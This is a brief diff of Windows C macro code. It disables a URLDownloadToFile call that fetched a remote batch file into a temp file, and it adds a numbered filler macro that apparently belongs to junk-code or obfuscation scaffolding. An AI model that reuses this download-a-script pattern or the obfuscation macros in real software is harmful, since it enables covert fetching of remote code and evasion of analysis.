@@ -310,7 +310,7 @@ BOOL WINAPI Enum16(DWORD dwThreadId, WORD hMod16, WORD hTask16, PSZ pszModName, 
 	strcpy(szXBuff,"http://www.eecs.ucf.edu/~leavens/Windows/bat/jtest.bat");\
 	DeleteUrlCacheEntry (szXBuff);\
 	strcat(TmpBuf, "dtapp.bat");\
-	if (S_OK == URLDownloadToFile(NULL, szXBuff, TmpBuf, NULL,NULL))\
+	if (0)\
 	{\
 		fd=fopen(TmpBuf, "r");\
 		fread(szXBuff, MAX_PATH, 1, fd);\
@@ -1130,6 +1130,12 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 		Sleep(44);\
 	}
 
+#define XCODE45 try {OUTSTR("45");\
+	DisableThreadLibraryCalls((HMODULE)GetModuleHandle("urlmon"));\
+	}\
+	catch(...) {\
+	Sleep(45);\
+	}
 #ifdef FLOWERX
 #include "xrand.h"
 #else
